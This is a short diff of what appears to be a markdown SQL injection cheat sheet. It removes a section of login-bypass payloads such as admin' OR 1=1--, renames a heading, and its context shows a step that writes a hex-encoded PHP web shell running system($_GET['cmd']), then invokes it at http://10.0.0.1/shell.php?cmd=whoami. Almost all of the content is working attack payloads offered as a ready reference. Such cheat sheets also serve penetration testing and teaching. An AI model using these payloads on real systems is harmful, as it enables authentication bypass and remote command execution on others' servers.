@@ -58,17 +58,6 @@ render_with_liquid: false
 
 <br />
 
-## Login form
-
-```html
-admin'--
-admin'#
-admin' OR 1=1--
-admin' OR 1=1#
-```
-
-<br />
-
 ## Blind SQL
 
 ```html
@@ -132,7 +121,7 @@ admin' OR 1=1#
 
 <br />
 
-## Write file
+## Write Files
 
 - Write new php file. '0x3C3F...' is hex ( <?php system($_GET["cmd"]) ?> in here )
 - Access to http://10.0.0.1/shell.php?cmd=whoami
